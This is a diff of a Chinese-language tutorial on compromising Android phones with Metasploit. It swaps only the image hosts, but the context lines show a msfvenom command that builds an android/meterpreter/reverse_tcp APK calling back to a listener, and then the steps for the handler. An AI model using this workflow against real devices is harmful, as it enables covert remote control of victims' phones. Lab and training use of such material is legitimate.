@@ -13,7 +13,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R>k.ap
 
 # 三、配置监控
 
-1. 启动msf   终端内输入：`msfconsole` 启动msf![1643003592876](https://img.gyxnb.top/img/1643003592876.png)
+1. 启动msf   终端内输入：`msfconsole` 启动msf![1643003592876](https://image.201068.xyz/assets/1643003592876.png)
 
 2. 载入监控模块  msf中输入：  
 
@@ -23,7 +23,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R>k.ap
 
    `set payload android/meterpreter/reverse_tcp`
 
-   ![1643003612323](https://img.gyxnb.top/img/1643003612323.png)
+   ![1643003612323](https://image.201068.xyz/assets/1643003612323.png)
 
 4. 配置payload  MSF终端中输入：`show options`
 
@@ -33,7 +33,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R>k.ap
 
 7. 执行监控  msf终端中输入： 
 
-   `run`![1643003633911](https://img.gyxnb.top/img/1643003633911.png)
+   `run`![1643003633911](https://image.201068.xyz/assets/1643003633911.png)
 
 # 四、攻击利用
 
@@ -43,7 +43,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R>k.ap
 
 3. 完成攻击利用
 
-   ![1643003654523](https://img.gyxnb.top/img/1643003654523.png)
+   ![1643003654523](https://image.201068.xyz/assets/1643003654523.png)
 
 
 
